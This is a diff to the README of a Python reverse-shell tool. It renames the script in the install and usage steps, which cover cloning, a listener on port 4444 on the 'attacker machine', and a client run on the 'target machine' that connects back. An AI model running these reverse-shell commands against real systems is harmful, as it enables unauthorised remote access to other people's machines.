@@ -37,7 +37,7 @@ pip install colorama
 ```console
 # 1. Clone repositori (if any) or copy the script to file .py
 git clone https://github.com/hidayat-tanjung/revershe.git  # Replace with original repo if available
-cd reverse-shell
+cd revershe/
 
 # 2. Install dependensi (just colorama)
 pip3 install colorama
@@ -46,7 +46,7 @@ pip3 install colorama
 chmod +x reverse.py  # Replace with your script file name
 
 # 4. Run the tool
-./reverse_shell.py
+./revershe.py
 ```
 🪟 Windows (PowerShell)
 ```console
@@ -56,24 +56,24 @@ chmod +x reverse.py  # Replace with your script file name
 pip install colorama
 
 # 3. Run the tool
-python reverse_shell.py
+python revershe.py
 ```
 
 🔌 Mode Listener (Server)
 ```console
-./reverse_shell.py -l -p 4444  # Listen for connections on port 4444
+./revershe.py -l -p 4444  # Listen for connections on port 4444
 ```
 Use this on attacker machine.
 
 🎯 Mode Connect (Client)
 ```console
-./reverse_shell.py -c 192.168.1.100 -p 4444  # Contact the listener on the target IP
+./revershe.py -c 192.168.1.100 -p 4444  # Contact the listener on the target IP
 ```
 Run this on the target machine to connect to the listener.
 
 If run without arguments, the tool will display an interactive menu:
 ```console
-./reverse_shell.py 
+./revershe.py 
 ```
 Select an option:
 
